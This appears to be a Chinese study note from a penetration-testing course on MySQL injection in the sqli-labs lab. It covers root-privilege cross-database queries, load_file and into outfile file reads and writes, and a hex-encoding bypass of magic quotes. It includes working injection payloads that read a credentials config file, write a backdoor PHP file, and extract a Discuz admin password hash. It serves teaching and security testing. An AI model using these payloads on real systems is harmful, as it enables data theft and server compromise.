前言：MYSQL 注入中首先要明确当前注入点权限，高权限注入时有更多的攻击手法，有的能直接进行 getshell 操作。其中也会遇到很多阻碍，相关防御方案也要明确，所谓知己知彼,百战不殆。不论作为攻击还是防御都需要了解其中的手法和原理，这样才是一个合格的安全工作者。

![](https://gitee.com/YatJay/image/raw/master/img/202201302159002.png)

# 涉及知识

## 高权限注入及低权限注入

高权限注入和信息收集中的数据库用户直接相关，数据库用户将决定注入是否享有高权限。当前注入点是否为高权限注入点，这是写在程序后台源码当中的，比如**后台在连接数据库时**使用的是root用户账号和密码，或者是普通用户账号和密码。比如sqlilabs程序连接数据库部分源码如下：

```php
<?php

//give your mysql connection username n password
$dbuser ='root';
$dbpass ='root';
$dbname ="security";
$host = 'localhost';
$dbname1 = "challenges";

?>
```

这说明sqlilabs连接数据库时使用的是root用户账号和密码。

### 数据库用户类型决定操作权限

#### root用户

root在MySQL数据库中属于最高权限，能操作主机上的所有数据库

#### 普通用户

除root之外其他都简称为为普通用户权限，能操作有限的一个或几个数据库

#### 跨库操作

跨库是指由于权限高，root用户不止能够操作自己的数据库，还可以操作普通用户的数据库的行为

##### 举例1：数据库用户类型决定操作权限

数据库A = 网站A = 数据库用户A=普通用户A——→若存在注入点，只能进行数据注入，只能查当前数据库

数据库B = 网站B = 数据库用户B=普通用户B——→若存在注入点，只能进行数据注入，只能查当前数据库

数据库C = 网站C = 数据库用户C=root用户——→若存在注入点，可进行高权限注入，可以跨库查询

这里A、B只能操作自己的数据库，而C就可以除了能够操作自己的数据库，还可以操作A、B的数据库(跨库)。

在安全测试的过程中，我们可以运用这种思想，通过获取最高权限后对其他关联数据库进行操作。

##### 举例2：实战：若存在SQL注入漏洞的数据库用户为root，则可以跨库拿到该主机其他数据库的内容，即该主机上其他站点的数据

在同个服务器存在网站A和网站B，对网站A进行安全测试没有发现漏洞，网站B存在SQL注入漏洞，我们就可以获取到网站B的数据库内容。而且如果网站B用户为**root用户**，我们就**间接拿到**网站A对应的数据库内容。

上一节所使用的database()函数只能查当前数据库名，若要跨库查其他数据库，则需要在`information_schema`库的`schemata`表中查询其他库名(目标库名一般和目标网站名称相关联)，`information_schema.schemata`  的列`schema_name`记录了所有数据库的名字。

| 表名                        | 字段信息                                                     |
| --------------------------- | ------------------------------------------------------------ |
| information_schema.schemata | 列schema_name记录了所有数据库的名字(高权限跨库查询时用来查数据库名) |

## 注入点的文件读写操作

### MySQL文件读写操作基础

会用到MySQL数据库里两个内置函数，这两个函数是MySQL数据库特有的，在其他数据库是没有的或者在其他数据库中写法不 同，所以这是为什么说注入点分数据库的原因，因为每个数据库内置的安全机制和它的功能不同，这才导致在注入的时候针对不用的数据库采取的攻击思路也不同。MySQL有内置读取的操作函数，我们可以调用这个函数作为注入的攻击。

在利用SQL注入漏洞后期，最常用的就是通过mysql的file系列函数来进行读取敏感文件或者写入webshell，其中比较常用的函数有以下三个：

- into dumpfile()
- into outfile()
- load_file()

#### 读写文件函数调用的限制

因为涉及到在服务器上写入文件，所以上述函数能否成功执行受到参数 `secure_file_priv` 的影响。官方文档中的描述翻译一下就是

- 其中当参数 `secure_file_priv` 为空(即不进行设置)时，对导入导出无限制
- 当值为一个指定的目录时，只能向指定的目录导入导出
- 当值被设置为NULL时，禁止导入导出功能

这个值可以通过命令 `select @@secure_file_priv` 查询。由于这个参数不能动态更改，只能在mysql的配置文件中进行修改，然后重启生效。

在 MySQL 5.5 之前` secure_file_priv` 默认是空，这个情况下可以向任意绝对路径写文件

在 MySQL 5.5之后 `secure_file_priv` 默认是 NULL，这个情况下不可以写文件

### load_file() 读取函数

#### 格式

```sql
load_file(‘文件名‘)
```

#### 注意事项

- 读取文件并返回文件内容为字符串。
- 使用此函数，
  - 该文件必须位于服务器主机上
  - 必须指定完整路径的文件
  - 必须有FILE权限
  - 该文件必须被所有和它的尺寸小于max_allowed_packet个字节可读。

- 如果该文件不存在或无法读取，因为前述条件之一不满足，则该函数将返回NULL。
- 书写文件路径注意
  - 文件路径须用一对引号括起
  - 文件路径中的分隔使用`/`或`\\`，避免使用一个`\`产生转义

- 若函数返回空值参考[mysql导出数据 select load_file("路径“）出现null](https://blog.csdn.net/qq_43504939/article/details/89207806)
- [常见的load_file()读取的敏感信息](https://blog.csdn.net/weixin_30292843/article/details/99381669)

#### load_file()示例

读取`D:/JayProgram/PHPstudy/PHPTutorial/WWW/test.txt`文件内容

```sql
?id=-1' union select 1,load_file('D:/JayProgram/PHPstudy/PHPTutorial/WWW/test.txt'),3--+
或
?id=-1' union select 1,load_file('D:\\\JayProgram\\PHPstudy\\PHPTutorial\\WWW\\test.txt'),3--+
```

![image-20220131112806387](https://gitee.com/YatJay/image/raw/master/img/202202221435820.png)

### into outfile 或 into dumpfile 导出函数

#### dumpfile与outfile的区别导出数据库场景下的差异

有两个值得注意的坑点

- outfile函数可以导出多行，而dumpfile只能导出一行数据

- outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式
  - outfile对导出内容中的\n等特殊字符进行转义，并且在文件内容的末尾增加一个新行
  - dumpfile对文件内容是原意写入，不做任何转移和增加。

- outfile后面不能接0x开头或者char转换以后的路径，只能是单引号路径。这个问题在php注入中更加麻烦，因为会自动将单引号转义成\',那么基本就GG了，但是load_file，后面的路径可以是单引号、0x、char转换的字符，但是路径中的斜杠是/而不是\
- 详细参考[mysql注入中的outfile、dumpfile、load_file函数详解](https://www.cnblogs.com/zztac/p/11371149.html)

#### into outfile

##### 格式

```SQL
select …… into outfile ‘文件路径’
```

##### 注意事项

- outfile对导出内容中的\n等特殊字符进行转义，并且在文件内容的末尾增加一个新行

- outfile函数可以导出多行

##### into outfile示例

```sql
?id=-1' union select 1, 'a\nabc\nabcde' ,3 into outfile 'd:/test.txt'--+
```
![](https://gitee.com/YatJay/image/raw/master/img/202201311744744.png)

![](https://gitee.com/YatJay/image/raw/master/img/202201311745806.png)

#### into dumpfile

##### 格式

```sql
select …… into dumpfile ‘文件名’
```

##### 注意事项

- dumpfile只能导出一行数据(一行不一定是一条)
- dumpfile对文件内容是原意写入，不做任何转义和增加。

##### into dumpfile示例

```SQL
?id=-1' union select 1, 'a\nabc\nabcde' ,3 into dumpfile 'd:/test.txt'--+
```

![](https://gitee.com/YatJay/image/raw/master/img/202201311744166.png)

![](https://gitee.com/YatJay/image/raw/master/img/202201311744874.png)

==注意outfile和dumpfile在输出时的大致区别即可，先不深究。==

## 获取路径及读取文件列表

### 路径获取的常见方法

#### 报错显示

网站报错的时候会泄漏出自己的路径（扫描工具/手动探测）

##### 示例：

![](https://img-blog.csdnimg.cn/img_convert/5089297daa1e958948df6bf96e73eec6.png)

#### 遗留文件

调试软件或者平台遗留下来的文件，经典的就是phpinfo.php(扫描工具可以扫到)

##### 示例

搜索：iurl:phpinfo.php

![](https://gitee.com/YatJay/image/raw/master/img/202201310936547.png)

可以看到网站路径为`/var/www/html/`

#### 漏洞报错

知道网站是用什么cms或者框架进行搭建的，用搜索引擎去找到对应的爆路径方式，比如搜索phpcms 爆路径

就可以利用该网站相关漏洞爆出网站路径，一般访问相应的文件地址，返回的报错信息就会显示网站路径信息

#### 平台配置文件

结合前面的读取文件操作来读取搭建网站平台的配置文件，通过[默认路径](https://blog.csdn.net/weixin_30292843/article/details/99381669)去尝试找到突破口，但如果更改了默认安装路径，也是很难进行（不怎么常用）。

##### 示例

Apache的默认配置文件目录为`/usr/local/app/apache2/conf/extratpd-vhosts.conf`在Apache安装目录下面的`/conf/extratpd-vhosts.conf`

![](https://gitee.com/YatJay/image/raw/master/img/202201310949001.png)

可以看到网站目录结构。

#### 爆破

什么信息都没办法获取到，我们运用一些常见固定的可能安装位置生成字典，对目标网站进行爆破

例如：

- windows：d:/www/root/xiaodi8/
- linux：/var/www/xiaodi8

### 读取文件列表——使用文件读写函数读写上述获得的文件及目录

找到路径后进行的操作，常见的就是读取文件列表

#### 读取敏感文件(演示)

假设已经获取网站路径，读取当前网站的数据库配置文件

```sql
?id=-1' union select 1, load_file('D:\\JayProgram\\PHPstudy\\PHPTutorial\\WWW\\PenTest\\sqlilabs\\sql-connections\\db-creds.inc') ,3 --+
```

![](https://gitee.com/YatJay/image/raw/master/img/202201312020273.png)

查看页面源代码可见读取的配置文件内容

![](https://gitee.com/YatJay/image/raw/master/img/202201312021945.png)

#### 写入后门文件(演示)

使用文件写入函数向指定目录写入“一句话木马”

```sql
?id=-1' union select 1, 'xxxxxxxxxxxxxxxx' ,3 into outfile 'D:/JayProgram/PHPstudy/PHPTutorial/WWW/PenTest/sqlilabs/xxx.php'--+
```

![](https://gitee.com/YatJay/image/raw/master/img/202201312025317.png)

查看可见写入成功

![](https://gitee.com/YatJay/image/raw/master/img/202201312025861.png)

### 常见读写文件问题：PHP魔术引号开关

#### magic_quotes_gpc开关

magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，对POST、POST、__GET以及进行数据库操作的sql进行转义处理，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。防止sql注入

当magic_quotes_gpc = On时，输入数据中含**单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）**等字符，都会被加上反斜线。这些转义是必须的。

php中的magic_quotes_gpc是配置在php.ini中。

#### 魔术引号绕过——编码或宽字节绕过

##### 编码绕过

将要写入的目录/路径进行十六进制编码后在注入点处写入，SQL可以执行十六进制编码的SQL语句，而且由于进行了编码，`magic_quotes_gpc`开关不会对十六进制编码中的特定字符进行过滤。

###### 编码绕过演示

开启`magic_quotes_gpc`开关

经过尝试在phpstudy中较高版本开启`magic_quotes_gpc`开关后访问网站会报Internal Server Error错误

需要切换PHP版本到**PHP-5.2.17**才可以

经过查询`magic_quotes_gpc`开关在高版本的PHP中已经移除。。。

![](https://gitee.com/YatJay/image/raw/master/img/202201312146770.png)

![](https://gitee.com/YatJay/image/raw/master/img/202201312048963.png)

**注意：sqlilabs-Lesson-1的SQL语句闭合需要单引号，若开启魔术引号则无法使用编码绕过故以下演示使用sqlilabs-Lesson-2**

常规文件读写操作

```sql
?id=-1 union select 1, load_file('D:\\JayProgram\\PHPstudy\\PHPTutorial\\WWW\\PenTest\\sqlilabs\\sql-connections\\db-creds.inc') ,3
```

![](https://gitee.com/YatJay/image/raw/master/img/202201312246861.png)

![](https://gitee.com/YatJay/image/raw/master/img/202201312148474.png)

可见输入数据中含**单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）**等字符，都被加上了反斜线，并不会执行SQL注入语句。

对SQL语句进行十六进制编码，在执行时函数参数不要加单引号，直接把不带引号的路径的十六进制结果写在参数位置上进行提交：

![](https://gitee.com/YatJay/image/raw/master/img/202201312315862.png)

```sql
?id=-1 union select 1, load_file(0x443A5C5C4A617950726F6772616D5C5C50485073747564795C5C5048505475746F7269616C5C5C5757575C5C50656E546573745C5C73716C696C6162735C5C73716C2D636F6E6E656374696F6E735C5C64622D63726564732E696E63),3
```

![](https://gitee.com/YatJay/image/raw/master/img/202201312312564.png)

查看页面源代码获得读取文件的内容

![](https://gitee.com/YatJay/image/raw/master/img/202201312313288.png)



**如果闭合需要单引号，就只能尝试宽字节了**

##### 宽字节绕过

(未讲解)

##  SQL注入的防护

### 1. 自带防御

如魔术引号

### 2. 内置函数

int等函数对提交内容进行检查

![](https://gitee.com/YatJay/image/raw/master/img/202201312208731.png)

### 3. 自定义关键字

对提交的select等关键字进行替换

![](https://gitee.com/YatJay/image/raw/master/img/202201312208162.png)

### 4. WAF防护软件

安全狗、宝塔等

防护软件一般也是对关键字进行防护、触发了waf等安全软件规则会将数据包丢弃。

WAF绕过时也是通过各种方法避免触发关键字，打乱关键字匹配规则。

WAF绕过详细不再本节课程中。

 ![](https://gitee.com/YatJay/image/raw/master/img/202201312208341.png)

## 低版本注入配合读取或暴力

### 低版本

mysql版本小于5.0

### 方法

#### 字典

即用列名、表名字典自己去跑来获得数据库信息。

#### 读取配合

如果当前数据库用户为root，则可以读取到当前php文件，在php文件中就有相关SQL语句，从这些SQL语句中可以得知表名、列名信息 。但是一般如果有root权限，可以直接写入后门文件获取webshell，不用读取文件信息。

一般低版本MySQL比较少见。

# 演示案例

## 普通用户及 root用户操作权限



## 高权限注入跨库查询操作测试

本地网站sqlilabs存在SQL注入漏洞，对注入点进行测试，先后过程如下：

测试注入点是否存在：

![](https://gitee.com/YatJay/image/raw/master/img/202201302249866.png)

测试当前数据表字段数——当前数据表共有3列

![](https://gitee.com/YatJay/image/raw/master/img/202201302251281.png)

![](https://gitee.com/YatJay/image/raw/master/img/202201302252103.png)

测试输出显示位置——输出显示位置为第2、3列

![](https://gitee.com/YatJay/image/raw/master/img/202201302253592.png)

获取数据库基本信息——当前数据库为security，当前用户为root

![](https://gitee.com/YatJay/image/raw/master/img/202201302254284.png)

存在SQL注入漏洞的网站sqlilabs的数据库用户为root，为高权限用户，因此可以进行跨库查询。

在`information_schema.schemata`表中查询主机上所有表名：

```sql
?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata--+
```

![](https://gitee.com/YatJay/image/raw/master/img/202201302248113.png)

这里我们选择Discuz的数据库discuz进行测试

在`information_schema.tables`中查询`discuz`库中的所有表名：

```sql
-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’discuz‘--+
```

![](https://gitee.com/YatJay/image/raw/master/img/202201302320233.png)

分别为discuz_common_admincp_cmenu,

discuz_common_admincp_group,

**discuz_common_admincp_member,**

discuz_common_admincp_perm,

discuz_common_admincp_session,

discuz_common_admingroup,

discuz_common_adminnote,

discuz_common_advertisement,

discuz_common_advertisement_custom,

discuz_common_banned,

discuz_common_block,

discuz_common_block_favorite,

discuz_common_blo 

==显然此处被截断了`group_concat()`已经输出最大长度，MYSQL内部对这个是有设置的，默认长度是1024==

经过搜索[Discuz! 3.2 中各数据库表的作用_Frank看庐山的博客-程序员宝宝](https://www.cxybb.com/article/qq_14989227/78184690)可以知道`pre_common_member` 是用户表，密码是随机生成记录，实际记录在UCenter。因此推测本地`discuz`的用户表名应该是`discuz_common_member` 。

在`information_schema.columns`中查询`discuz`库中的`discuz_common_member`表的所有列名：

```sql
id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='discuz_common_member' and table_schema='discuz'--+
```

![](https://gitee.com/YatJay/image/raw/master/img/202201310905413.png)

得到`discuz`库中的`discuz_common_member`表的所有列名分别是：

在数据表`discuz.discuz_common_member`中查询指定数据`username`和`password`，并且限制显示的数据条目数量

```sql
id=-1' union select 1,username,password from discuz.discuz_common_member limit 0,1--+
```

![](https://gitee.com/YatJay/image/raw/master/img/202201310915972.png)

```sql
id=-1' union select 1,username,password from discuz.discuz_common_member limit 1,1--+
```

![](https://gitee.com/YatJay/image/raw/master/img/202201310911451.png)

查到`discuz.discuz_common_member`表中只有一条数据即:`username`为`admin`，`password`为`785abd34df1042f9d15efe598b926ebc`(已被加密)。

## 高权限注入文件读写操作测试



## 魔术引号开启后相关操作测试



## 相关自定义代码过滤操作测试